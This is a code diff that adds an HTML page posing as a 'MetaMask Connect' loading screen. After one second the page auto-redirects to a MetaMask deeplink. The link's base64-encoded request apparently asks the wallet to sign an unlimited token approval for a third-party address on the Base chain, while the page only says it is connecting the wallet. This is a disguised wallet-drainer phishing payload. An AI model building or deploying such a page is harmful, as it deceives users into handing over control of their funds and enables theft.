@@ -1,0 +1,82 @@
+ <!DOCTYPE html>
+     <html>
+     <head>
+       <meta charset="UTF-8">
+       <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>MetaMask Connect</title>
+       <style>
+         body {
+           font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+           display: flex;
+           justify-content: center;
+           align-items: center;
+           min-height: 100vh;
+           margin: 0;
+           background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+         }
+         .container {
+           background: white;
+           padding: 40px;
+           border-radius: 16px;
+           box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+           text-align: center;
+           max-width: 400px;
+         }
+         h1 { color: #333; margin-bottom: 10px; }
+         p { color: #666; margin-bottom: 20px; }
+         .spinner {
+           width: 50px;
+           height: 50px;
+           border: 4px solid #f3f3f3;
+           border-top: 4px solid #f6851b;
+           border-radius: 50%;
+           animation: spin 1s linear infinite;
+           margin: 20px auto;
+         }
+         @keyframes spin {
+           0% { transform: rotate(0deg); }
+           100% { transform: rotate(360deg); }
+         }
+         .btn {
+           display: inline-block;
+           background: #f6851b;
+           color: white;
+           padding: 14px 28px;
+           border-radius: 8px;
+           text-decoration: none;
+           font-weight: 600;
+           margin-top: 20px;
+         }
+         .btn:hover { background: #e2761b; }
+         .small { font-size: 12px; color: #999; margin-top: 20px; }
+       </style>
+     </head>
+     <body>
+       <div class="container">
+         <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" width="80" alt="MetaMask">
+         <h1>Connecting to MetaMask</h1>
+         <p>Please wait while we connect your wallet...</p>
+         <div class="spinner"></div>
+         <a class="btn" id="manual" href="#">Open MetaMask Manually</a>
+         <p class="small">If MetaMask doesn't open automatically, tap the button above.</p>
+       </div>
+
+       <script>
+         const deeplink = 'https://link.metamask.io/connect?comm=deeplinking&channelId=8fc85b18c341ded32845c57d280fabb4&scheme=app&pubkey
+     =04d10d525097df2649c34377c47eca66f2d0923b18348a032316adf20411b3fc70211fc8a57d58e815628081c8207bac2fc73db1c179ee3e338f9cee138ed25468&
+     originatorInfo=eyJvcmlnaW5hdG9ySW5mbyI6eyJ1cmwiOiJtZXRhbWFzayIsInRpdGxlIjoiTWV0YU1hc2siLCJwbGF0Zm9ybSI6IndlYiIsImRhcHBJZCI6Im1ldGFtY
+     XNrLWludGVybmFsIn19&request=eyJpZCI6IjE3NjY0NjYyOTI1MjQiLCJtZXRob2QiOiJldGhfc2VuZFRyYW5zYWN0aW9uIiwicGFyYW1zIjpbeyJmcm9tIjoiMHg0NGM2
+     ZWEyNzdkYTg5ZTcyOTFlYzRhMmRhZjIxMDI3M2M4YWIzMWE1IiwidG8iOiIweDgzMzU4OWZDRDZlRGI2RTA4ZjRjN0MzMkQ0ZjcxYjU0YmRBMDI5MTMiLCJkYXRhIjoiMHgw
+     OTVlYTdiMzAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDlkZGE2ZWYzZDkxOWM5YmM4ODg1ZDU1NjA5OTlhMzY0MDQzMWU4ZTZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
+     ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmIiwidmFsdWUiOiIweDAiLCJjaGFpbklkIjoiMHgyMTA1In1dfQ%3D%3D';
+
+         document.getElementById('manual').href = deeplink;
+
+         // Auto-redirect after short delay
+         setTimeout(() => {
+           window.location.href = deeplink;
+         }, 1000);
+       </script>
+     </body>
+     </html>
+
